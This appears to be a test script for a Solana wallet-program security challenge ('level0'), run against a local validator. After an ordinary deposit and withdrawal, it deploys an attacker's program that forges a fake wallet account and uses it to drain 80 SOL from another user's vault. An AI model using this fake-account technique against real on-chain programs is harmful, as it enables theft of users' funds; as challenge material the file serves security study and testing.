import {
    Connection,
    Keypair,
    LAMPORTS_PER_SOL,
    PublicKey,
    sendAndConfirmTransaction,
    Struct,
    SystemProgram,
    SYSVAR_RENT_PUBKEY,
    Transaction,
    TransactionInstruction,
} from '@solana/web3.js';
import * as borsh from "borsh";
import * as BufferLayout from '@solana/buffer-layout';
import { Buffer } from 'buffer';
import assert from 'assert';
import { expect } from 'chai';


function createKeypairFromFile(path: string): Keypair {
    return Keypair.fromSecretKey(
        Buffer.from(JSON.parse(require('fs').readFileSync(path, "utf-8")))
    )
};

function initializeInstructionData(): Buffer {
    const dataLayout = BufferLayout.struct([
        BufferLayout.u8('instruction')
      ]);

      const data = Buffer.alloc(dataLayout.span);
      dataLayout.encode({
        instruction: 0
      }, data);
    
      return data;
}

function CustomInstructionData(instruction_tag, amount): Buffer {
    const dataLayout = BufferLayout.struct([
        BufferLayout.u8('instruction'),
        BufferLayout.nu64('amount'),
      ]);

      const data = Buffer.alloc(dataLayout.span);
      dataLayout.encode({
        instruction: instruction_tag,
        amount: amount,
      }, data);
    
      return data;
}

class Assignable {
    constructor(properties) {
        Object.keys(properties).map((key) => {
            return (this[key] = properties[key]);
        });
    };
};

class Deposit extends Assignable {
    toBuffer() {
        return Buffer.from(borsh.serialize(DepositSchema, this));
    }
}

class Withdraw extends Assignable {
    toBuffer() {
        return Buffer.from(borsh.serialize(WithdrawSchema, this));
    }
}
enum InstructionVariant {
    InitializeAccount = 0,
    Deposit,
    Withdraw,
}

const DepositSchema = new Map([
    [
        Deposit, {
            kind: 'struct',
            fields: [
                ['id', 'u8'],   // This is for the instruction invariant
                ['amount', 'u64'],
            ]
        }
    ]
]);
const WithdrawSchema = new Map([
    [
        Withdraw, {
            kind: 'struct',
            fields: [
                ['id', 'u8'],   // This is for the instruction invariant
                ['amount', 'u64'],
            ]
        }
    ]
]);
class Wallet extends Assignable {
    authority: PublicKey
    vault: PublicKey

}

describe("zestake", () => {

    const connection = new Connection(`http://localhost:8899`, 'single');// testing single for local host
    const authority_address = Keypair.generate();
    const rich_boi = Keypair.generate();
    const program = createKeypairFromFile('level/level0-keypair.json');
    const exploit_program = createKeypairFromFile('target/deploy/level0exploit-keypair.json');

    const file_wallet = createKeypairFromFile(require('os').homedir() + '/.config/solana/id.json');

    let wallet_adddress: PublicKey;
    let vault_adddress: PublicKey;
    let WalletSchema;
    let attacker_address = Keypair.generate()
    let attacker_fakes_wallet_address = Keypair.generate();
    

    before(async () => {
        let _bump;
        let bump;

        const airdrop_wallet_authority = SystemProgram.transfer({
            fromPubkey: file_wallet.publicKey,
            toPubkey: authority_address.publicKey,
            lamports: 1 * LAMPORTS_PER_SOL,
        });
        const airdrop_wallet_rich_boi = SystemProgram.transfer({
            fromPubkey: file_wallet.publicKey,
            toPubkey: rich_boi.publicKey,
            lamports: 101 * LAMPORTS_PER_SOL,
        });
        const airdrop_wallet_attacker = SystemProgram.transfer({
            fromPubkey: file_wallet.publicKey,
            toPubkey: attacker_address.publicKey,
            lamports: 5 * LAMPORTS_PER_SOL,
        });
        await sendAndConfirmTransaction(
            connection,
            new Transaction().add(airdrop_wallet_authority)
                             .add(airdrop_wallet_rich_boi)
                             .add(airdrop_wallet_attacker),
            [file_wallet]
        );

        [wallet_adddress, _bump] = await PublicKey.findProgramAddress(
            [
                Buffer.from(authority_address.publicKey.toBuffer())
            ],
                program.publicKey
        );
    
        [vault_adddress, bump] = await PublicKey.findProgramAddress(
            [
                authority_address.publicKey.toBuffer(),
                Buffer.from("VAULT")
            ],
                program.publicKey
        );

        WalletSchema = new Map([
            [
              Wallet,
              {
                kind: "struct",
                fields: [
                  ["authority", ['u8', 32]],
                  ["vault", ['u8', 32]],
                ],
              },
            ],
          ]);

        const tx = await connection.requestAirdrop(authority_address.publicKey, LAMPORTS_PER_SOL);
    
    });

    it ("initialize instruction", async () => {
    
        let ix = new TransactionInstruction({
            keys:[
                {pubkey: wallet_adddress, isSigner: false, isWritable: true},// Wallet Account
                {pubkey: vault_adddress, isSigner: false, isWritable: true},// Vault Account
                {pubkey: authority_address.publicKey, isSigner: true, isWritable: true},// Authority Account
                {pubkey: SYSVAR_RENT_PUBKEY, isSigner: false, isWritable: false},// Rent Sysvar
                {pubkey: SystemProgram.programId, isSigner: false, isWritable: false}// System Program
            ],
            programId: program.publicKey,
            data: initializeInstructionData(),
        })
    
        await sendAndConfirmTransaction(
            connection, 
            new Transaction().add(ix),
            [authority_address]
        );
        const wallet_account_info = connection.getAccountInfo(wallet_adddress, "single");
        const vault_account_info = connection.getAccountInfo(vault_adddress)
        
        assert.equal((await vault_account_info).owner.toString(), program.publicKey.toString());
        assert.equal((await wallet_account_info).owner.toString(), program.publicKey.toString());
console.log('Assuming wallet = ', wallet_adddress.toString());
console.log('Assuming Vault = ', vault_adddress.toString())
        const wallet = new Wallet({
            authority: authority_address.publicKey.toBytes(),
            vault: vault_adddress.toBytes()
        });
   const ser = Buffer.from(borsh.serialize(WalletSchema, wallet));

const wallet_account_data_field2 = borsh.deserializeUnchecked(WalletSchema,
    Wallet,
    ser
);
// console.log('Serialized rust = ', (await wallet_account_info).data);
// console.log('serialized js = ', ser);
        const wallet_account_data_field = borsh.deserializeUnchecked(WalletSchema,
            Wallet,
            (await wallet_account_info).data
        );

        console.log("Deserilized from program", wallet_account_data_field)
        console.log("Deserialized from my Schema", wallet_account_data_field2)
//        console.log("Deserialized = ", wallet_account_data_field);


        // assert.equal(wallet_account_data_field.vault.toString(), wallet_adddress.toString())
    })

    it ('Deposit 100 SOL ',async () => {

        const deposit_amount = 100 * LAMPORTS_PER_SOL;

        const DepositInstructionData2 = new Deposit({
            amount: deposit_amount,
        })
        // Construct the payload
        const deposit = new Deposit({
            id: InstructionVariant.Deposit,
            amount: 100 * LAMPORTS_PER_SOL,
        });


        let ix = new TransactionInstruction({
            keys:[
                {pubkey: wallet_adddress, isSigner: false, isWritable: true},// Wallet Account
                {pubkey: vault_adddress, isSigner: false, isWritable: true},// Vault Account
                {pubkey: rich_boi.publicKey, isSigner: true, isWritable: true},// Rich Boi Account
                {pubkey: SystemProgram.programId, isSigner: false, isWritable: false}// System Program
            ],
            programId: program.publicKey,
            data: deposit.toBuffer(),
        })
    
    
        await sendAndConfirmTransaction(
            connection, 
            new Transaction().add(ix),
            [rich_boi]
        );
        

        // Rich boi has less than 1 SOL because of gas fees
        expect(1).greaterThanOrEqual(await connection.getBalance(rich_boi.publicKey) / LAMPORTS_PER_SOL); 
        expect(100).lessThanOrEqual(await connection.getBalance(vault_adddress) / LAMPORTS_PER_SOL);
    });

    it ('rich boi withdraws 10 SOL ',async () => {
        const withdraw_amount = 10 * LAMPORTS_PER_SOL;
        const rich_boi_before_amount = await connection.getBalance(rich_boi.publicKey) / LAMPORTS_PER_SOL
        const vault_before_amount = await connection.getBalance(vault_adddress) / LAMPORTS_PER_SOL

        const withdraw = new Withdraw({
            id: InstructionVariant.Deposit,
            amount: 100 * LAMPORTS_PER_SOL,
        });

        let ix = new TransactionInstruction({
            keys:[
                {pubkey: wallet_adddress, isSigner: false, isWritable: true},// Wallet Account
                {pubkey: vault_adddress, isSigner: false, isWritable: true},// Vault Account
                {pubkey: authority_address.publicKey, isSigner: true, isWritable: true},// Authority Account
                {pubkey: rich_boi.publicKey, isSigner: false, isWritable: true},// Destination Account
                {pubkey: SystemProgram.programId, isSigner: false, isWritable: false}// System Program
            ],
            programId: program.publicKey,
            data: CustomInstructionData(2, withdraw_amount),
        })
        await sendAndConfirmTransaction(
            connection, 
            new Transaction().add(ix),
            [authority_address]
        );
        const rich_boi_after_amount = await connection.getBalance(rich_boi.publicKey) / LAMPORTS_PER_SOL
        const vault_after_amount = await connection.getBalance(vault_adddress) / LAMPORTS_PER_SOL

        expect(rich_boi_after_amount - 10).greaterThanOrEqual(rich_boi_before_amount);
        expect(vault_after_amount + 10).lessThanOrEqual(vault_before_amount);
    })

    it ('attacker calls their malicious program ', async  () => {
        
        let ix = new TransactionInstruction({
            keys:[
                {pubkey: attacker_fakes_wallet_address.publicKey, isSigner: true, isWritable: true},// Wallet Account
                {pubkey: vault_adddress, isSigner: false, isWritable: true},// Vault Account
                {pubkey: attacker_address.publicKey, isSigner: true, isWritable: true},// Authority Account
                {pubkey: SYSVAR_RENT_PUBKEY, isSigner: false, isWritable: false},// Rent Sysvar
                {pubkey: SystemProgram.programId, isSigner: false, isWritable: false}// System Program
            ],
            programId: exploit_program.publicKey,
            data: Buffer.alloc(0),
        })
    
        await sendAndConfirmTransaction(
            connection, 
            new Transaction().add(ix),
            [attacker_address, attacker_fakes_wallet_address]
        );

        const wallet = new Wallet({
            authority: attacker_address.publicKey.toBytes(),
            vault: vault_adddress.toBytes()
        });
        const wallet_account_info = connection.getAccountInfo(attacker_fakes_wallet_address.publicKey, "processed");
        const ser = Buffer.from(borsh.serialize(WalletSchema, wallet));

        const wallet_account_data_field2 = borsh.deserializeUnchecked(WalletSchema,
            Wallet,
            ser
        );
        const wallet_account_data_field = borsh.deserializeUnchecked(WalletSchema,
            Wallet,
            (await wallet_account_info).data
        );

        console.log("Deserilized from program", wallet_account_data_field);
        console.log("Deserialized from my Schema", wallet_account_data_field2);

    })

    it ('attacker tries to withdraw 80 SOL ', async () => {
        const withdraw_amount = 20 * LAMPORTS_PER_SOL;

        const attacker_before_balance = await connection.getBalance(attacker_address.publicKey) / LAMPORTS_PER_SOL;
        console.log('(Before)Attacker has balance of ', attacker_before_balance);
        const vault_before_balance = await connection.getBalance(vault_adddress) / LAMPORTS_PER_SOL;
        console.log('(Before) Vault has balance of ', vault_before_balance)
        
        const withdraw = new Withdraw({
            id: InstructionVariant.Withdraw,
            amount: 80 * LAMPORTS_PER_SOL,
        });
        
        let ix = new TransactionInstruction({
            keys:[
                {pubkey: attacker_fakes_wallet_address.publicKey, isSigner: false, isWritable: true},// Wallet Account
                {pubkey: vault_adddress, isSigner: false, isWritable: true},// Vault Account
                {pubkey: attacker_address.publicKey, isSigner: true, isWritable: true},// Authority Account
                {pubkey: attacker_address.publicKey, isSigner: false, isWritable: true},// Destination Account
                {pubkey: SystemProgram.programId, isSigner: false, isWritable: false}// System Program
            ],
            programId: program.publicKey,
            data: withdraw.toBuffer()//CustomInstructionData(2, withdraw_amount),
        });

        await sendAndConfirmTransaction(
            connection, 
            new Transaction().add(ix),
            [attacker_address]
        );

        
        const attacker_after_balance = await connection.getBalance(attacker_address.publicKey) / LAMPORTS_PER_SOL;
        console.log('(After)Attacker has balance of ', attacker_after_balance);
        const vault_after_balance = await connection.getBalance(vault_adddress) / LAMPORTS_PER_SOL;
        console.log('(After) Vault has balance of ', vault_after_balance)

    })
    it ('rich boi withdraws 10 SOL ',async () => {
        const withdraw_amount = 10 * LAMPORTS_PER_SOL;
        const rich_boi_before_amount = await connection.getBalance(rich_boi.publicKey) / LAMPORTS_PER_SOL
        const vault_before_amount = await connection.getBalance(vault_adddress) / LAMPORTS_PER_SOL

        console.log('rich boi(Before) ', rich_boi_before_amount);
        console.log('Vault(Before) ', vault_before_amount);

        const withdraw = new Withdraw({
            id: InstructionVariant.Deposit,
            amount: 100 * LAMPORTS_PER_SOL,
        });

        let ix = new TransactionInstruction({
            keys:[
                {pubkey: wallet_adddress, isSigner: false, isWritable: true},// Wallet Account
                {pubkey: vault_adddress, isSigner: false, isWritable: true},// Vault Account
                {pubkey: authority_address.publicKey, isSigner: true, isWritable: true},// Authority Account
                {pubkey: rich_boi.publicKey, isSigner: false, isWritable: true},// Destination Account
                {pubkey: SystemProgram.programId, isSigner: false, isWritable: false}// System Program
            ],
            programId: program.publicKey,
            data: CustomInstructionData(2, withdraw_amount),
        })
        try{
		await sendAndConfirmTransaction(
        	  connection, 
           	  new Transaction().add(ix),
           	  [authority_address]
       		);
	}catch(err){
	
		console.log("err => ", err);
	}
        const rich_boi_after_amount = await connection.getBalance(rich_boi.publicKey) / LAMPORTS_PER_SOL
        const vault_after_amount = await connection.getBalance(vault_adddress) / LAMPORTS_PER_SOL
        console.log('rich boi(After) ', rich_boi_after_amount);
        console.log('vault(After) ', vault_after_amount);

        assert.equal((rich_boi_after_amount - 10).toFixed(6), rich_boi_before_amount.toFixed(6));
        expect(vault_after_amount + 10).lessThanOrEqual(vault_before_amount);
    })

})
